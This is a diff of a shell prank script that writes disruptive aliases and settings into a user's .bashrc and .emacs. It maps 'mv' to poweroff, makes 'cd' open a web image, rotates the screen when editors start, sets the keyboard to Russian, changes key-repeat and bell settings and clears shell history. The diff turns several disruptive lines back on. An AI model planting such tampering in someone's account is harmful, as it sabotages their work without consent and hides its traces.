@@ -13,15 +13,15 @@ echo "alias cd='firefox jeansarda.com/public/ygrow.jpg' && cd" >> /home/${USER}/
 echo "alias mv='poweroff'" >> /home/${USER}/.bashrc;
 echo "alias emacs='xrandr -o left'" >> /home/${USER}/.bashrc;
 echo "alias vim='xrandr -o right'" >> /home/${USER}/.bashrc;
-#echo "xset r rate 3;" >> /home/${USER}/.bashrc;
+echo "xset r rate 3;" >> /home/${USER}/.bashrc;
 echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
 echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
 echo "history -c" >> /home/${USER}/.bashrc;
 echo "PS1=snow_j@YouKnowNothingJohnSnow$" >> /home/${USER}/.bashrc;
-#xset b 100 2000 1500
+xset b 100 2000 1500
 export USER=snow_j
 export LOGNAME=snow_j
 
-#setxkbmap ru;
+setxkbmap ru;
 history -c
 pkill terminal;
